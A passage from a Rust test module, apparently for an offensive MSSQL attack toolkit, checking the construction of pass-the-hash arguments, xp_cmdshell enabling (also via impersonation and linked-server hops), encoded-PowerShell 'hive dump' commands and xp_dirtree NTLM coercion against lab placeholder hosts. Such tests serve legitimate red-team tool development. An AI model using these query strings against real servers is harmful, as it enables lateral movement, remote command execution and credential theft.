        );
        assert_eq!(
            argv,
            vec![
                "contoso.local/alice:P@ssw0rd!@192.168.58.51".to_string(),
                "-windows-auth".to_string(),
            ]
        );
    }

    #[test]
    fn auth_args_pass_the_hash_drops_password_and_adds_hashes() {
        // Owned via secretsdump (NT hash, no plaintext): the linked-server
        // pivot must connect as this exact login, so pass-the-hash is required.
        let argv = mssql_auth_args(
            Some("contoso.local"),
            "alice",
            None,
            Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
            "192.168.58.51",
            true,
        );
        assert_eq!(
            argv,
            vec![
                "contoso.local/alice@192.168.58.51".to_string(),
                "-windows-auth".to_string(),
                "-hashes".to_string(),
                "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".to_string(),
            ]
        );
    }

    #[test]
    fn auth_args_bare_nt_hash_gets_lm_prefix() {
        let argv = mssql_auth_args(
            Some("contoso.local"),
            "alice",
            None,
            Some("31d6cfe0d16ae931b73c59d7e0c089c0"),
            "192.168.58.51",
            true,
        );
        assert_eq!(argv[2], "-hashes");
        assert_eq!(argv[3], ":31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn from_args_reads_hash_and_forces_windows_auth() {
        let args = json!({
            "target": "192.168.58.51",
            "username": "alice",
            "domain": "contoso.local",
            "hash": ":31d6cfe0d16ae931b73c59d7e0c089c0",
        });
        // windows_auth defaults true because a hash is present.
        let hash = optional_str(&args, "hash");
        assert!(hash.is_some());
        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or_else(|| hash.is_some());
        assert!(windows_auth);
    }

    #[test]
    fn linked_exec_hop_doubles_inner_single_quotes() {
        // The sysadmin-status probe query carries `'sysadmin'`; without quote
        // doubling the source server errors with "Incorrect syntax near
        // 'sysadmin'" and the cross-forest hop never fires.
        let hop = build_linked_exec_hop("SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sa;", "SQL02");
        assert_eq!(
            hop,
            "EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'') AS is_sa;') AT [SQL02];"
        );
        // The outer EXEC string literal must have balanced quotes: an even
        // number of single quotes total once the inner ones are doubled.
        assert_eq!(hop.matches('\'').count() % 2, 0);
    }

    #[test]
    fn linked_exec_hop_quote_free_query_unchanged() {
        let hop = build_linked_exec_hop("SELECT @@SERVERNAME AS srv;", "SQL02");
        assert_eq!(hop, "EXEC ('SELECT @@SERVERNAME AS srv;') AT [SQL02];");
    }

    // ── far-host hop-style variants ────────────────────────────────────

    #[test]
    fn hive_enable_hop_exec_at_matches_configure_form() {
        let hop = build_hive_enable_hop("SQL02", HopStyle::ExecAt);
        assert!(hop.starts_with("EXEC ('sp_configure"));
        assert!(hop.ends_with("AT [SQL02];"));
        assert!(hop.contains("''xp_cmdshell''"));
        // Balanced outer-literal quotes: every inner single quote is doubled.
        assert_eq!(hop.matches('\'').count() % 2, 0);
    }

    #[test]
    fn hive_enable_hop_openquery_wraps_and_appends_select() {
        // OPENQUERY needs its inner query to return a rowset — the trailing
        // `SELECT 1 AS ok` is what makes the wrapper legal after RECONFIGURE.
        let hop = build_hive_enable_hop("SQL02", HopStyle::OpenQuery);
        assert!(hop.starts_with("SELECT * FROM OPENQUERY([SQL02],"));
        assert!(hop.contains("SET FMTONLY OFF"));
        assert!(hop.contains("SELECT 1 AS ok"));
        // Two layers of literal escaping: the inner `sp_configure 'x'` needs
        // to appear as `sp_configure ''''x''''` after both layers.
        assert!(hop.contains("sp_configure ''''xp_cmdshell''''"));
    }

    #[test]
    fn hive_dump_hop_exec_at_wraps_xp_cmdshell() {
        let hop = build_hive_dump_hop("powershell -EncodedCommand ABC=", "SQL02", HopStyle::ExecAt);
        assert_eq!(
            hop,
            "EXEC ('xp_cmdshell ''powershell -EncodedCommand ABC=''') AT [SQL02];"
        );
    }

    #[test]
    fn hive_dump_hop_openquery_double_escapes_inner_xp_cmdshell() {
        let hop = build_hive_dump_hop(
            "powershell -EncodedCommand ABC=",
            "SQL02",
            HopStyle::OpenQuery,
        );
        // Outer OPENQUERY literal ('...') requires xp_cmdshell's own quotes
        // to be doubled TWICE (once per string layer) — 4 apostrophes each
        // side of the inner argument.
        assert!(hop.contains("EXEC xp_cmdshell ''''powershell -EncodedCommand ABC=''''"));
        assert!(hop.starts_with("SELECT * FROM OPENQUERY([SQL02],"));
    }

    // --- mssql_from_args required fields ---

    #[test]
    fn mssql_requires_target() {
        let args = json!({"username": "sa"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn mssql_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn mssql_windows_auth_default_false_without_domain() {
        let args = json!({"target": "192.168.58.1", "username": "sa"});
        let domain = optional_str(&args, "domain");
        let windows_auth = optional_bool(&args, "windows_auth")
            .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));
        assert!(!windows_auth);
    }

    #[test]
    fn mssql_windows_auth_default_true_with_domain() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "svc_sql",
            "domain": "contoso.local"
        });
        let domain = optional_str(&args, "domain");
        let windows_auth = optional_bool(&args, "windows_auth")
            .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));
        assert!(windows_auth);
    }

    #[test]
    fn mssql_windows_auth_explicit_true() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "windows_auth": true
        });
        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or(false);
        assert!(windows_auth);
    }

    // --- mssql_base auth string via impacket_target ---

    #[test]
    fn mssql_auth_string_with_domain_and_password() {
        let auth_str =
            credentials::impacket_target(Some("CONTOSO"), "sa", Some("P@ss"), "192.168.58.1");
        assert_eq!(auth_str, "CONTOSO/sa:P@ss@192.168.58.1");
    }

    #[test]
    fn mssql_auth_string_no_domain() {
        let auth_str = credentials::impacket_target(None, "sa", Some("P@ss"), "192.168.58.1");
        assert_eq!(auth_str, "sa:P@ss@192.168.58.1");
    }

    #[test]
    fn mssql_auth_string_no_password() {
        let auth_str = credentials::impacket_target(Some("CONTOSO"), "sa", None, "192.168.58.1");
        assert_eq!(auth_str, "CONTOSO/sa@192.168.58.1");
    }

    // --- mssql_command ---

    #[test]
    fn mssql_command_requires_command() {
        let args = json!({"target": "192.168.58.1", "username": "sa"});
        assert!(required_str(&args, "command").is_err());
    }

    // --- mssql_enable_xp_cmdshell ---

    #[test]
    fn enable_xp_cmdshell_impersonate_query_format() {
        let user = "sa";
        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        let query = format!("EXECUTE AS LOGIN = '{user}'; {base_query}");
        assert!(query.starts_with("EXECUTE AS LOGIN = 'sa';"));
        assert!(query.contains("xp_cmdshell"));
    }

    #[test]
    fn enable_xp_cmdshell_no_impersonate() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "password": "P@ss"
        });
        let impersonate_user = optional_str(&args, "impersonate_user");
        assert!(impersonate_user.is_none());
        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        let query = match impersonate_user {
            Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
            None => base_query.to_string(),
        };
        assert!(!query.starts_with("EXECUTE AS LOGIN"));
    }

    // --- mssql_impersonate ---

    #[test]
    fn impersonate_query_format() {
        let impersonate_user = "sa";
        let query = "SELECT SYSTEM_USER;";
        let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");
        assert_eq!(full_query, "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;");
    }

    #[test]
    fn impersonate_requires_impersonate_user() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "query": "SELECT 1"
        });
        assert!(required_str(&args, "impersonate_user").is_err());
    }

    #[test]
    fn impersonate_requires_query() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "impersonate_user": "dbo"
        });
        assert!(required_str(&args, "query").is_err());
    }

    // --- mssql_exec_linked ---

    #[test]
    fn linked_server_query_format() {
        let linked_server = "SQL02";
        let query = "SELECT SYSTEM_USER;";
        let full_query = format!("EXEC ('{query}') AT [{linked_server}];");
        assert_eq!(full_query, "EXEC ('SELECT SYSTEM_USER;') AT [SQL02];");
    }

    #[test]
    fn linked_server_requires_linked_server() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "query": "SELECT 1"
        });
        assert!(required_str(&args, "linked_server").is_err());
    }

    #[test]
    fn linked_server_requires_query() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "linked_server": "SQL02"
        });
        assert!(required_str(&args, "query").is_err());
    }

    // --- mssql_linked_enable_xpcmdshell ---

    #[test]
    fn linked_enable_xpcmdshell_format() {
        let linked_server = "SQL02";
        let full_query = format!(
            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
             EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
        );
        assert!(full_query.contains("AT [SQL02]"));
        assert!(full_query.contains("xp_cmdshell"));
    }

    // --- mssql_linked_xpcmdshell ---

    #[test]
    fn linked_xpcmdshell_format() {
        let linked_server = "SQL02";
        let command = "whoami";
        let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
        assert_eq!(full_query, "EXEC ('xp_cmdshell ''whoami''') AT [SQL02];");
    }

    #[test]
    fn linked_xpcmdshell_requires_command() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "linked_server": "SQL02"
        });
        assert!(required_str(&args, "command").is_err());
    }

    // --- mssql_ntlm_coerce ---

    #[test]
    fn ntlm_coerce_xp_dirtree_format() {
        let listener_ip = "192.168.58.5";
        let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");
        assert_eq!(
            full_query,
            "EXEC master..xp_dirtree '\\\\192.168.58.5\\share'"
        );
    }

    #[test]
    fn ntlm_coerce_requires_listener_ip() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa"
        });
        assert!(required_str(&args, "listener_ip").is_err());
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn mssql_command_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa",
            "password": "P@ss", "command": "SELECT @@version"
        });
        assert!(super::mssql_command(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_command_windows_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "CONTOSO",
            "windows_auth": true, "command": "SELECT 1"
        });
        assert!(super::mssql_command(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enable_xp_cmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enable_xp_cmdshell_impersonate_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "impersonate_user": "dbo"
        });
        assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enum_impersonation_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enum_impersonation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_impersonate_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "impersonate_user": "dbo", "query": "SELECT SYSTEM_USER"
        });
        assert!(super::mssql_impersonate(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enum_linked_servers_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enum_linked_servers(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_exec_linked_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02", "query": "SELECT 1"
        });
        assert!(super::mssql_exec_linked(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_linked_enable_xpcmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02"
        });
        assert!(super::mssql_linked_enable_xpcmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_linked_xpcmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02", "command": "whoami"
        });
        assert!(super::mssql_linked_xpcmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_ntlm_coerce_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "listener_ip": "192.168.58.5"
        });
        assert!(super::mssql_ntlm_coerce(&args).await.is_ok());
    }
}
